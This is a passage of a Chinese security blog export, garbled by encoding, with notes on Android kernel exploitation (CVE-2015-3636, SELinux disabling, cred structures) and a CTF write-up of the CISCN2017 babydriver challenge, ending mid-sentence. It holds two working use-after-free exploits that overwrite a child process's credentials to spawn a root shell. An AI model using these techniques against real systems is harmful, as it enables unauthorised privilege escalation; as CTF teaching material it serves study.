ç³»ç»Ÿè°ƒç”¨](https://www.jianshu.com/p/350dc21fe5e3)\n\né€šè¿‡pipe()åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œè¿”å›ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œfd[0]ä¸ºè¯»ï¼Œfd[1]ä¸ºå†™ã€‚\n\n```c\nint kernel_read4(void* kernel_addr,  unsigned int* value)\n{\n    int pipefd[2];\n    pipe(pipefd)\n    write(pipefd[1], kernel_addr, 4)\n\tread(pipefd[0], value, 4)\n    return 0;\n}\n\nint kernel_write4(void* kernel_addr, unsigned int* value)\n{\n    int pipefd[2];\n    pipe(pipefd)\n    write(pipefd[1], value, 4)\n    read(pipefd[0], kernel_addr, 4)\n    return 0;\n}\n```\n\n\n\n\n\n## å…³é—­selinux\n\nå¦‚ä½•æŸ¥çœ‹selinuxçŠ¶æ€ï¼Ÿ\n\n> `/usr/sbin/sestatus -v `æˆ–è€…`getenforce`\n\né€šè¿‡å†…æ ¸é•œåƒä¸­ï¼Œå¦‚selinux_init()ã€sel_read_enforce()ã€sel_write_enforce()ç­‰å‡½æ•°ï¼Œå¯ä»¥å®šä½åˆ°selinux_enforcingçš„å†…å­˜åœ°å€ã€‚\n\n- selinux_enforcingä¸º0ï¼ŒSELinuxä¸ºpermissiveæ¨¡å¼\n- selinux_enforcingä¸º1ï¼ŒSELinuxä¸ºenforcingæ¨¡å¼\n\n```c\n// IDAä¸­ä¼ªä»£ç å¦‚ä¸‹\n__int64 __fastcall sel_read_enforce(__int64 a1, __int64 a2, __int64 a3, __int64 a4)\n{\n  int v7; // w0\n  _BYTE v9[16]; // [xsp+30h] [xbp+30h] BYREF\n\n  v7 = scnprintf(v9, 12i64, \"%d\", MEMORY[0xFFFFFFC00065399C]);\n    //0xFFFFFFC00065399Cå³selinux_enforcing\n  return simple_read_from_buffer(a2, a3, a4, v9, v7);\n}\n// å¯¹åº”çš„æºç å¦‚ä¸‹\nstatic ssize_t sel_read_enforce(struct file *filp, char __user *buf,\n\t\t\t\tsize_t count, loff_t *ppos)\n{\n\tchar tmpbuf[TMPBUFLEN];\n\tssize_t length;\n\n\tlength = scnprintf(tmpbuf, TMPBUFLEN, \"%d\", selinux_enforcing);\n\treturn simple_read_from_buffer(buf, count, ppos, tmpbuf, length);\n}\n```\n\n\n\n## thread_infoä¸task_struct\n\n### task_struct\n\n[task_structç»“æ„ä½“](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/sched.h#L1041)ä¸­ï¼Œé™¤äº†æ¼æ´åˆ©ç”¨ææƒæ—¶æ¯”è¾ƒå…³æ³¨çš„credç»“æ„ä½“ä»¥å¤–ï¼Œè¿˜æœ‰ä¸ªç‰¹æ®Šçš„æŒ‡é’ˆ`void *stack`ï¼Œå®ƒæŒ‡å‘å†…æ ¸æ ˆï¼ŒåŒæ—¶ä¹Ÿæ˜¯thread_infoç»“æ„ä½“çš„å­˜æ”¾åœ°å€ã€‚\n\n```c\nstruct task_struct {\n\tvolatile long state;\t/* -1 unrunnable, 0 runnable, >0 stopped */\n\tvoid *stack;\t\t\t\n\tatomic_t usage;\n    \n\tunsigned int flags;\t/* per process flags, defined below */\n\tunsigned int ptrace;\n\t// ......\n    /* process credentials */\n\tconst struct cred __rcu *real_cred; /* objective and real subjective task\n\t\t\t\t\t * credentials (COW) */\n\tconst struct cred __rcu *cred;\t/* effective (overridable) subjective task\n\t\t\t\t\t * credentials (COW) */\n    // ......\n}\n```\n\n`void *stack`æŒ‡å‘ä¸€ä¸ªè”åˆä½“ï¼Œå«åš`thread_union`ï¼Œå³ä»£è¡¨å†…æ ¸æ ˆï¼Œä¹Ÿä»£è¡¨thread_infoã€‚\n\n```c\nunion thread_union {\n\tstruct thread_info thread_info;\n\tunsigned long stack[THREAD_SIZE/sizeof(long)];\n};\n```\n\ntask_structï¼Œthread_infoå’Œå†…æ ¸æ ˆä¹‹é—´çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚\n\n[å†…æ ¸æ ˆä¸thread_infoç»“æ„è¯¦è§£](https://www.cnblogs.com/yungyu16/p/13023982.html)\n\n![image-20220919162607272](image-20220919162607272.png?size=600)\n\n\n\n### thread_info\n\n```c\ntypedef unsigned long mm_segment_t;\n\nstruct thread_info {\n\tunsigned long\t\tflags;\t\t/* low level flags */\n\tmm_segment_t\t\taddr_limit;\t/* address limit */\n\tstruct task_struct\t*task;\t\t/* main task structure */\n\tstruct exec_domain\t*exec_domain;\t/* execution domain */\n\tstruct restart_block\trestart_block;\n\tint\t\t\tpreempt_count;\t/* 0 => preemptable, <0 => bug */\n\tint\t\t\tcpu;\t\t/* cpu */\n};\n```\n\n\n\n# å…¶ä»–\n\n## andoridæ¨¡æ‹Ÿå™¨\n\nandroidæ¨¡æ‹Ÿå™¨æœ‰å¾ˆå¤šï¼Œ[15 best Android emulators for PC and Mac of 2022](https://www.androidauthority.com/best-android-emulators-for-pc-655308/)ï¼Œandroid studioé€‚åˆå¼€å‘è€…ï¼Œqemu-androidé€‚åˆç ”ç©¶è°ƒè¯•ã€‚\n\nçŒœæµ‹ï¼šåªæœ‰android studioå’Œqemu-androidå¯ä»¥æ¨¡æ‹Ÿarmæ¶æ„çš„androidï¼Œå…¶ä»–æ¨¡æ‹Ÿå™¨ï¼ˆå¤§å¤šæ•°ï¼‰éƒ½æ˜¯x86æ¶æ„çš„androidã€‚å› ä¸ºandroid studioå’Œqemu-androidéƒ½æ˜¯è°·æ­Œå®¶å¼€å‘çš„ã€‚\n\n- [**qemu-android**](https://qemu-android.googlesource.com/?format=HTML)ï¼šè°·æ­Œå¼€å‘äººå‘˜åŸºäºqemuæ›´æ”¹çš„æ¨¡æ‹Ÿå™¨ï¼Œç”¨äºå¯åŠ¨goldfishå¯¹åº”çš„androidã€‚[Difference among Android's emulator command variations](https://stackoverflow.com/a/38938169)\n\n- [**goldfish**](https://android.googlesource.com/kernel/goldfish/+refs)ï¼š[ç”±è°·æ­Œå¼€å‘å¹¶å‘½åçš„ä¸€ä¸ªè™šæ‹ŸCPUï¼ˆæˆ–boardï¼‰ï¼Œç”¨äºAndroidæ¨¡æ‹Ÿå™¨](https://groups.google.com/g/android-kernel/c/M4SjXulUeUo/m/M5BCX9bfk2oJ)\n\n- **ranchu**ï¼šæˆ‘è®¤ä¸ºå¯ä»¥ç®€å•çš„æŠŠranchuç†è§£ä¸ºgoldfishçš„å‡çº§ç‰ˆï¼Œå¯¹åº”æœ‰å‡çº§ç‰ˆçš„qemu-androidï¼ˆä¹Ÿå¯ç§°ä¹‹ä¸ºqemu-ranchuï¼‰ã€‚[New emulator code base (qemu-android) and \"ranchu\" virtual board](https://groups.google.com/g/android-emulator-dev/c/dltBnUW_HzU/m/2tSZNLaVzmQJ)\n\nå¯¹äºæƒ³å‡†ç¡®ç ”ç©¶ä»¥ä¸Šæ¦‚å¿µçš„åŒå­¦ï¼Œæ¨èå‚è€ƒä¹¦ç±ï¼š[Android System Programming](https://www.oreilly.com/library/view/android-system-programming/9781787125360/)\n\n\n\n\n\n## ubuntu ndkç¼–è¯‘ç¯å¢ƒ\n\nå‚è€ƒäº†è¿™ç¯‡æ–‡ç« ï¼š[ubuntuä¸‹android ndkç¼–è¯‘ç¯å¢ƒæ­å»ºæ–¹æ³•](https://www.cxybb.com/article/qq_45683435/113838305)\n\nä¸‹è½½[android-ndk-r13b](https://dl.google.com/android/repository/android-ndk-r13b-linux-x86_64.zip)ï¼Œç„¶åæŒ‰ç…§å¦‚ä¸‹å‘½ä»¤å®‰è£…\n\n```shell\n~$ unzip android-ndk-r13b-linux-x86_64.zip\n~$ mkdir ndk-android-tool-chain\n~$ cd ./android-ndk-r13b/build/tools\n~/android-ndk-r13b/build/tools$ ./make-standalone-toolchain.sh  --arch=arm64 --platform=android-21 --install-dir=/home/bling/ndk-android-tool-chain --force\n~/android-ndk-r13b/build/tools$ ./make-standalone-toolchain.sh  --arch=arm64 --platform=android-21 --force\n# åœ¨/home/bling/ndk-android-tool-chain/binç›®å½•ä¸‹æœ‰æˆ‘ä»¬éœ€è¦çš„ç¼–è¯‘å™¨android gccåŠndk-build\n# æœ€åï¼Œå°†è¯¥è·¯å¾„é…ç½®åˆ°ç¯å¢ƒå˜é‡ä¸­\n# export PATH=/home/bling/ndk-android-tool-chain/bin:$PATH\n# export PATH=/home/bling/android-ndk-r13b:$PATH\n```\n\n\n\n## æå–å†…æ ¸ä»£ç å¹¶æ¢å¤ç¬¦å·\n\n### æ—§æ–¹æ³• - IDApythonè„šæœ¬\n\n[é€†å‘ARM64å†…æ ¸zImage](http://www.hhjack.com/arm64_zimage_reverseengineering_with_ida_pro/)\n\n[ä»Androidè®¾å¤‡ä¸­æå–å†…æ ¸å’Œé€†å‘åˆ†æ](https://blog.csdn.net/QQ1084283172/article/details/57074695)\n\nImageå°±æ˜¯å†…æ ¸ä»£ç ï¼Œç”±äºç³»ç»Ÿæœªå¼€å¯KASLRï¼Œé€šè¿‡å¯åŠ¨æ—¶æ‰“å°çš„logæˆ‘ä»¬å¯ä»¥è·å¾—å†…æ ¸åŠ è½½åŸºå€0xffffffc000080000ã€‚\n\n![image-20220724182224254](image-20220724182224254.png?size=600)\n\nIDAæ‰“å¼€Imageï¼Œå¹¶è®¾ç½®å¥½ROM start addresså’ŒLoading addressï¼Œä»æ–‡ä»¶å¤´å¼€å§‹æŒ‰\"P\"è§£æå‡½æ•°ã€‚å‘ç°å‡½æ•°æ²¡æœ‰ç¬¦å·ã€‚\n\näºæ˜¯å›åˆ°adb shellä¸­ï¼Œå¯¼å‡ºå†…æ ¸ç¬¦å·è¡¨\n\n```shell\necho 0 > /proc/sys/kernel/kptr_restrict\ncat /proc/kallsyms > /data/local/tmp/1.txt\n```\n\nåˆ©ç”¨å†…æ ¸ç¬¦å·è¡¨æ–‡ä»¶ï¼Œæ¢å¤IDAä¸­å¯¹åº”çš„å‡½æ•°åï¼ŒIDAè„šæœ¬å¦‚ä¸‹\n\n```python\nimport idc\nimport idaapi\nksyms = open(\"D:\\\\yuanyuan\\\\abc.txt\")\t# å¯¼å‡ºçš„å†…æ ¸ç¬¦å·è¡¨æ–‡ä»¶\nfor line in ksyms:\n    addr = int(line[0:16],16)\n    name = line[19:].replace('_','')\n    name = line[19:].replace('\\n','')\n\tidc.create_insn(addr)\t\t\t# å°†æŒ‡å®šåœ°å€å¤„çš„æœºå™¨ç ç¿»è¯‘æˆæ±‡ç¼–æŒ‡ä»¤\n\tida_funcs.add_func(addr, BADADDR)\t# åœ¨æŒ‡å®šåœ°å€å¤„åˆ›å»ºä¸€ä¸ªå‡½æ•°\n    idc.set_name(addr, name, SN_CHECK)\t\t\t# é‡å‘½åaddrå¤„å‡½æ•°ä¸ºname\n    Message(\"%08X:%s\"%(addr,name))\n```\n\næ¢å¤ç¬¦å·è¡¨åï¼Œå‘ç°è¿˜æœ‰å¾ˆå¤šå‡½æ•°æ²¡æœ‰æ¢å¤æˆåŠŸï¼Œæ˜¯å› ä¸ºå‡½æ•°åå†²çªäº†ã€‚ä½†æ˜¯ä¸å½±å“åˆ†æã€‚\n\n### æ–°æ–¹æ³• - vmlinux-to-elf\n\n[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)å¯ä»¥å°† vmlinux/vmlinuz/bzImage/zImageç­‰å†…æ ¸é•œåƒæ¢å¤ç¬¦å·å¹¶è½¬æ¢æˆelfæ ¼å¼ï¼Œä¾¿äºIDAåˆ†æã€‚\n\n![image-20220921230829799](image-20220921230829799.png?size=600)\n\nä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š\n\n```bash\ngit clone https://github.com/marin-m/vmlinux-to-elf.git\ncd vmlinux-to-elf\n./vmlinux-to-elf <xxx> xxx.elf\n```\n\n## ç¼–è¯‘è°ƒè¯•linux-3.10å†…æ ¸é•œåƒ\n\n```bash\ngit clone https://github.com/torvalds/linux.git -b v3.10 --depth=1\ncd linux\n# æŒ‡å®šäº¤å‰ç¼–è¯‘å™¨ã€‚å¯¹äºå°äº3.18ç‰ˆæœ¬çš„å†…æ ¸ï¼Œç¼–è¯‘å™¨ç‰ˆæœ¬éœ€å°äº5.0\nmake ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig\nmake ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- -j4\n```\n\n\n\n# å‚è€ƒæ–‡æ¡£\n\n- CVE-2015-3636åˆ†ææ–‡æ¡£\n\n[[åŸåˆ›]CVE-2015-3636(pingpong root) androidå†…æ ¸ UAFæ¼æ´åˆ†æ ](https://bbs.pediy.com/thread-230298.htm)\n\n[cve-2015-3636 - 20000s](https://blog.csdn.net/qq_37439229/article/details/122843627?spm=1001.2014.3001.5502)\n\n[Study CVE-2015-3636 - I](https://1ce0ear.github.io/2020/03/01/root-cve-2015-3636/)\n\n[CVE-2015-3636æ¼æ´åˆ†æ](http://pwn4.fun/2017/08/03/CVE-2015-3636%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)\n\n[CVE-2015-3636](https://a7vinx.github.io/2016/12/04/cve_2015_3636/)\n\n[CVE-2015-3636å†…æ ¸æ¼æ´åˆ†æ](https://idhyt.blogspot.com/2016/03/cve-2015-3636.html)è¿™ç¯‡æ–‡ç« ä¸­è¯´ï¼Œx86-64æ¶æ„ä¸Šåˆ©ç”¨è¯¥æ¼æ´ä»…èƒ½é€ æˆç³»ç»Ÿå´©æºƒï¼Œè€Œéx86-64æ¶æ„ï¼ˆå¦‚armï¼‰å¯åˆ©ç”¨æ”¹æ¼æ´ææƒã€‚\n\nçœŸå®è®¾å¤‡åˆ©ç”¨expï¼š[CVE-2015-3636 exp.by.fi01](https://github.com/fi01/CVE-2015-3636)\n\nå­˜åœ¨è¯¥æ¼æ´çš„ç‰ˆæœ¬ï¼š linux kernel <=v4.1-rc1\n\n- å…¶ä»–å‚è€ƒæ–‡æ¡£\n\n[Androidå†…æ ¸çš„ç¼–è¯‘å’Œè°ƒè¯•åŠgdb cheatsheet](https://its301.com/article/QQ1084283172/70500488)\n\n[å­—èŠ‚ctf2021 androidé¢˜ä¸­ç”¨åˆ°äº†dockerè¿è¡Œapk](https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg#qkNWuR)\n\n[Searchable Linux Syscall Table for x86 and x86_64](https://filippo.io/linux-syscall-table/)\n\n\n\n\n\n","tags":["socket","android","goldfish"],"categories":["æ¼æ´å¤ç°"]},{"title":"ç¬¬ä¸€é“å†…æ ¸pwn-CISCN2017-babydriver","url":"/2022/08/28/CISCN2017-babydriver/","content":"\n\n\nè¿™æ˜¯ä¸€é“linuxå†…æ ¸CTFçš„å…¥é—¨é¢˜ï¼Œå¯¹äºå®Œå…¨æ²¡æœ‰linuxå†…æ ¸koå¼€å‘ç»éªŒçš„åŒå­¦ï¼Œåšè¿™é“é¢˜ä¹‹å‰ï¼Œå»ºè®®å…ˆå­¦ä¸€ä¸‹å®‹å®åçš„ã€ŠLinuxè®¾å¤‡é©±åŠ¨å¼€å‘è¯¦è§£ã€‹å¹¶å®è·µå­—ç¬¦è®¾å¤‡é©±åŠ¨çš„å¼€å‘è¿‡ç¨‹ï¼Œäº†è§£read/write/ioctl/mmapè¿™äº›åŸºæœ¬å†…æ ¸æ¥å£çš„å®ç°å’ŒåŸç†ã€‚\n\nç¬¬ä¸€ç§è§£æ³•ï¼š\n\n[[CISCN 2017] babydriver](http://1.15.94.35:8090/archives/ciscn2017babydriver)\n\n[CISCN 2017 babydriver (UAFåˆ©ç”¨æ–¹æ³•)](https://beafb1b1.github.io/kernel/ciscn_2017_babydriver_UAF/)\n\nå¦ä¸€ç§è§£æ³•ï¼š\n\n[linux kernel pwnå­¦ä¹ ä¹‹ä¼ªé€ tty_structæ‰§è¡Œä»»æ„å‡½æ•°](https://blog.csdn.net/seaaseesa/article/details/104577501)\n\n# åˆ†æ\n\né¢˜ç›®é™„ä»¶ï¼š[CISCN2017-babydriver](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)\n\næœ¬é¢˜æ¼æ´koä¸ºbabydriver.koï¼Œæ³¨å†Œäº†å¦‚ä¸‹ä¸€äº›å‡½æ•°å¯¹ç”¨æˆ·æ€æä¾›æœåŠ¡\n\n![image-20220805171100848](image-20220805171100848.png?size=600)\n\n`babyopen()` å‡½æ•°ä¸­ï¼Œç”³è¯·äº†ä¸€ä¸ª0x64å¤§å°çš„å †ï¼Œç„¶åå°†å †åœ°å€å’Œå¤§å°èµ‹ç»™`babydev_struct`è¿™ä¸ªç»“æ„ä½“çš„æˆå‘˜ï¼ˆdevice_bufå 8å­—èŠ‚ï¼Œdevice_buf_lenå 2å­—èŠ‚ï¼‰ã€‚`babydev_struct`æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæœªè®¾ç½®ä»»ä½•ä¿æŠ¤æªæ–½ã€‚å› æ­¤ï¼Œå½“æœ‰ä¸¤ä¸ªç”¨æˆ·åŒæ—¶æ‰“å¼€`open(\"/dev/babydev\",2)`è¯¥è®¾å¤‡èŠ‚ç‚¹æ—¶ï¼Œåä¸€ä¸ªopenæ“ä½œï¼Œå°†è¦†ç›–`babydev_struct.device_buf`ä¸Šçš„å€¼ï¼Œå¯¼è‡´ä¸¤ä¸ªç”¨æˆ·ï¼ˆä¸åŒfdï¼‰æŒ‡å‘åŒä¸€å †å—ã€‚\n\n```c\nint __fastcall babyopen(inode *inode, file *filp)\n{\n  __int64 v2; // rdx\n\n  _fentry__(inode, (_DWORD)filp, v2);\n  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);\n  babydev_struct.device_buf_len = 64LL;\n  printk(\"device open\\n\", 37748928LL);\n  return 0;\n}\n```\n\n`babyread()`å‡½æ•°é€»è¾‘ç®€å•ï¼Œåˆ¤æ–­ç”¨æˆ·æ€ä¼ å…¥çš„é•¿åº¦æ˜¯å¦å°äº`babydev_struct.device_buf_len`ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶åˆ™å°†`babydev_struct.device_buf`æŒ‡å‘çš„å†…å®¹æ‹·è´åˆ°ç”¨æˆ·æ€ã€‚\n\n```c\nssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)\n{\n  size_t v4; // rdx\n  ssize_t result; // rax\n  ssize_t v6; // rbx\n\n  _fentry__(filp, (_DWORD)buffer, length);\n  if ( !babydev_struct.device_buf )\n    return -1LL;\n  result = -2LL;\n  if ( babydev_struct.device_buf_len > v4 )\n  {\n    v6 = v4;\n    copy_to_user(buffer);\n    return v6;\n  }\n  return result;\n}\n```\n\n`babywrite()`å‡½æ•°è·Ÿ`babyread()`å‡½æ•°ç±»ä¼¼ï¼Œåˆ¤æ–­æ¡ä»¶é€šè¿‡åï¼Œå°†ç”¨æˆ·æ€çš„æ•°æ®æ‹·è´ç»™`babydev_struct.device_buf`ã€‚\n\n```c\nssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)\n{\n  size_t v4; // rdx\n  ssize_t result; // rax\n  ssize_t v6; // rbx\n\n  _fentry__(filp, (_DWORD)buffer, length);\n  if ( !babydev_struct.device_buf )\n    return -1LL;\n  result = -2LL;\n  if ( babydev_struct.device_buf_len > v4 )\n  {\n    v6 = v4;\n    copy_from_user();\n    return v6;\n  }\n  return result;\n}\n```\n\n`babyioctl()`åªæœ‰ä¸€ä¸ªåˆ†æ”¯ï¼ˆcommandï¼‰ï¼Œå®ƒå…ˆå°†`babydev_struct.device_buf`æŒ‡å‘çš„å †å—é‡Šæ”¾æ‰ï¼Œç„¶åæ ¹æ®ç”¨æˆ·æ€ä¼ å…¥çš„argå‚æ•°ç”³è¯·**ä»»æ„å¤§å°**å †å—ï¼Œå¹¶æ›´æ–°`babydev_struct`ç»“æ„ä½“ä¸­ä¸¤ä¸ªæˆå‘˜ã€‚\n\n```c\n__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)\n{\n  size_t v3; // rdx\n  size_t v4; // rbx\n\n  _fentry__(filp, command, arg);\n  v4 = v3;\n  if ( command == 0x10001 )\n  {\n    kfree(babydev_struct.device_buf);\n    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);\n    babydev_struct.device_buf_len = v4;\n    printk(\"alloc done\\n\", 37748928LL);\n    return 0LL;\n  }\n  else\n  {\n    printk(&unk_2EB, v3);\n    return -22LL;\n  }\n}\n```\n\n`babyrelease()`å‡½æ•°åœ¨`close(fd)`å…³é—­è®¾å¤‡èŠ‚ç‚¹æ—¶ä¼šè¢«è°ƒç”¨åˆ°ï¼Œè¿™é‡Œé‡Šæ”¾äº†`babydev_struct.device_buf`æŒ‡å‘çš„å †å—ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ç½®ç©ºï¼Œå­˜åœ¨**UAF**æ¼æ´ã€‚\n\n```c\nint __fastcall babyrelease(inode *inode, file *filp)\n{\n  __int64 v2; // rdx\n\n  _fentry__(inode, (_DWORD)filp, v2);\n  kfree(babydev_struct.device_buf);\n  printk(\"device release\\n\", filp);\n  return 0;\n}\n```\n\næ€»ç»“ä¸€ä¸‹ï¼š\n\n- ä¸¤ä¸ªç”¨æˆ·ï¼ˆfd1, fd2ï¼‰å¯ä»¥æŒ‡å‘åŒä¸€ä¸ªå†…æ ¸ç»“æ„ä½“\n- ç”¨æˆ·1ï¼ˆfd1ï¼‰å¯ä»¥ä¸ºè¯¥ç»“æ„ä½“ç”³è¯·ä¸€ä¸ªä»»æ„å¤§å°çš„å †å—ç„¶åé‡Šæ”¾è¯¥å †å—\n- ç”¨æˆ·2ï¼ˆfd2ï¼‰è·å¾—ä¸€ä¸ªå‚æ‚¬æŒ‡é’ˆã€‚\n\n# åˆ©ç”¨\n\n## æ–¹æ³•1 - æ”¹å­è¿›ç¨‹cred\n\n> å‰ç½®çŸ¥è¯†ï¼šfork()ä¸€ä¸ªå­è¿›ç¨‹æ—¶ï¼Œå†…æ ¸ä¼šä¸ºcredåˆ†é…0xa8å¤§å°çš„å †ç”¨äºå­˜æ”¾ç»“æ„ä½“å†…å®¹ã€‚\n\nåˆ©ç”¨ioctlæ„é€ 0xa8å¤§å°çš„å †å—ï¼Œç„¶åè°ƒç”¨closeé‡Šæ”¾è¯¥å †å—ã€‚ç´§æ¥ç€forkä¸€ä¸ªå­è¿›ç¨‹ï¼Œå°±èƒ½ä¸ºcredåˆ†é…åˆ°åˆšåˆšé‡Šæ”¾çš„0xa8å †å—ã€‚\n\næœ€åé€šè¿‡å‚æ‚¬æŒ‡é’ˆæ›´æ”¹credå†…å®¹ï¼Œè·å¾—root shellã€‚\n\n### åœ¨å­è¿›ç¨‹ä¸­æ”¹å †ä¸­å†…å®¹\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main(){\n\tint fd1 = open(\"/dev/babydev\",2);\n\tint fd2 = open(\"/dev/babydev\",2);\t\t\t// ä¸¤ä¸ªfdåœ¨å†…æ ¸ä¸­å¯¹åº”åŒä¸€ä¸ªbabydev_structç»“æ„ä½“\n\n\tioctl(fd1,0x10001,0xa8);\t\t\t\t\t// babydev_struct.device_bufè¢«è¦†ç›–æˆ0xa8å¤§å°å †çš„åœ°å€\n\tclose(fd1);\t\t\t\t\t\t\t\t\t\t\t\t// fd2åœ¨å†…æ ¸ä¸­è·å¾—ä¸€ä¸ªå‚æ‚¬æŒ‡é’ˆ\n\n\tpid_t fpid; \n\tfpid=fork(); \t\t\t\t\t\t\t// ï¼Ÿforkå­è¿›ç¨‹ï¼Œå†…æ ¸ä¼šä¸ºå…¶credç»“æ„ä½“ç”³è¯·0xa8å¤§å°çš„å †ï¼Œåœ¨æ— å¹²æ‰°çš„æƒ…å†µä¸‹ï¼Œæ­£å¥½åˆ†é…åˆ°ä¸Šè¿°é‡Šæ”¾çš„å †å—\n\tif (fpid < 0) {\n\t\tprintf(\"error in fork!\\n\"); \n\t\texit(0);\n\t}else if (fpid == 0) {\n\t\tprintf(\"child pid is : %d\\n\",getpid());\n    char zeros[30] = {0};\n    write(fd2,zeros,28);\t\t\t\t// ï¼Ÿé€šè¿‡fd2æ›´æ”¹credå †å—å†…å®¹ï¼Œå°†uidï¼Œgidæ”¹ä¸º0\n\t\t// if(getuid() == 0){\n\t\tsystem(\"/bin/sh\");\t\t\t\t\t// èµ·ä¸€ä¸ªshellï¼ˆrootï¼‰\n\t\texit(0);\n\t\t// }\n\t}else {\n\t\twait(NULL);\n\t\tprintf(\"parent pid is: %d\\n\",getpid());\n\t}\n\tprintf(\"%d: going to close fd2\\n\",getpid());\n\tclose(fd2);\t\t\t\t\t//åªæœ‰çˆ¶è¿›ç¨‹ä¼šè¿›å…¥æ­¤å¤„ï¼Œå­è¿›ç¨‹exit(0)æ—¶å·²é€€å‡º\n\n\treturn 0;\n}\n```\n\nçˆ¶è¿›ç¨‹ä¸­ä½¿ç”¨`wait(NULL);`ï¼Œé˜²æ­¢å­è¿›ç¨‹è¿˜æœªæ‰§è¡Œå®Œæˆï¼Œçˆ¶è¿›ç¨‹ä¾¿å·²æå‰é€€å‡ºã€‚[wait(NULL)](https://blog.csdn.net/Ting_Yann/article/details/107545429)è¿™ç¯‡æ–‡ç« ä¸­çš„ â€œå°Šè€çˆ±å¹¼â€ ä¸€è¯ç”ŸåŠ¨åœ°è§£é‡Šäº†æœ‰æ— `wait(NULL);`çš„åŒºåˆ«ã€‚\n\næœ¬é¢˜éœ€åœ¨çˆ¶è¿›ç¨‹ä¸­ä½¿ç”¨è¯¥ç­‰å¾…ï¼Œå¦åˆ™æ— æ³•åœ¨forkçš„å­è¿›ç¨‹ä¸­ç¨³å®šè·å¾—shellã€‚\n\n![image-20220805161208901](image-20220805161208901.png?size=600)\n\n\n\n### åœ¨çˆ¶è¿›ç¨‹ä¸­æ”¹å †ä¸­å†…å®¹\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main(){\n    int fd1 = open(\"/dev/babydev\",2);\n    int fd2 = open(\"/dev/babydev\",2);\n\n    ioctl(fd1,0x10001,0xa8);\n    close(fd1);\n\n    pid_t fpid; \n    fpid=fork(); \t\t\t\t//å­è¿›ç¨‹çš„credç»“æ„ä½“æ­£å¥½ç”³è¯·åˆ°close(fd1)é‡Šæ”¾çš„å †ï¼Œä½†fd2ä¾ç„¶æœ‰æŒ‡é’ˆæŒ‡å‘è¯¥å †å—\n    if (fpid < 0) {\n        printf(\"error in fork!\\n\"); \n        exit(0);\n    }else if (fpid == 0) {\n        printf(\"waiting...\")\t\t\t// å­è¿›ç¨‹ä¸­ï¼Œç­‰å¾…3sï¼Œç­‰çˆ¶è¿›ç¨‹æ›´æ”¹uidå’Œgid\n        sleep(3);\n        system(\"/bin/sh\");\t\t\t\t// get root shell !!!\n        exit(0);\n    }else {\n        char zeros[30] = {0};\t\t\t// çˆ¶è¿›ç¨‹ä¸­ï¼Œé€šè¿‡fd2æ›´æ”¹ï¼ˆUAFï¼‰å †å—ï¼ˆå­è¿›ç¨‹çš„credç»“æ„ä½“ï¼‰\n        write(fd2,zeros,28);\n        wait(NULL);\t\t\t\t\t\t\t\t// é˜²æ­¢çˆ¶è¿›ç¨‹é€€å‡ºå¯¼è‡´å­è¿›ç¨‹root shellè¢«è¦†ç›–\n    }\n    close(fd2);\n    return 0;\n}\n```\n\n\n\n## æ–¹æ³•2 - tty_struct\n\n[Linuxä¸­çš„ttyã€ptyã€ptsä¸ptmxè¾¨æ](https://blog.csdn.net/zhoucheng05_13/article/details/86510469)\n\n[Linuxä¼ªç»ˆç«¯](https://www.jianshu.com/p/11c01003211b)\n\nå½“ç”¨æˆ·æ‰“å¼€`/dev/ptmx`è®¾å¤‡èŠ‚ç‚¹æ—¶ï¼Œå†…æ ¸ä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ª`tty_struct`ç»“æ„ä½“\n\nè¯¥é¢˜ç›®ç‰ˆæœ¬ä¸­ï¼Œtty_structå¤§å°ï¼š`0x2e0`\n\ntty_struct->tty_operationsçš„åç§»ä¸º`4+4+8+8=24`\n\n```c\nstruct tty_struct {\n\tint\tmagic;\n\tstruct kref kref;\n\tstruct device *dev;\n\tstruct tty_driver *driver;\n\tconst struct tty_operations *ops;\n  // Â·Â·Â·Â·Â·Â·\n}\n// è§ç½‘é¡µhttps://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272\n```\n\ntty_operationsç»“æ„ä½“ä¸­éƒ¨åˆ†æˆå‘˜å¦‚ä¸‹ï¼š\n\n```c\nstruct tty_operations {\n\tstruct tty_struct * (*lookup)(struct tty_driver *driver,\n\t\t\tstruct file *filp, int idx);\n\tint  (*install)(struct tty_driver *driver, struct tty_struct *tty);\n\tvoid (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n\tint  (*open)(struct tty_struct * tty, struct file * filp);\n\tvoid (*close)(struct tty_struct * tty, struct file * filp);\n\tvoid (*shutdown)(struct tty_struct *tty);\n\tvoid (*cleanup)(struct tty_struct *tty);\n\tint  (*write)(struct tty_struct * tty,\n\t\t      const unsigned char *buf, int count);\n\tint  (*put_char)(struct tty_struct *tty, unsigned char ch);\n\tvoid (*flush_chars)(struct tty_struct *tty);\n\tint  (*write_room)(struct tty_struct *tty);\n\tint  (*chars_in_buffer)(struct tty_struct *tty);\n\tint  (*ioctl)(struct tty_struct *tty,\n\t\t    unsigned int cmd, unsigned long arg);\n  // ......\n}\n```\n\n\n\n### åŠ«æŒæ§åˆ¶æµ\n\nä½¿ç”¨å¦‚ä¸‹ä»£ç 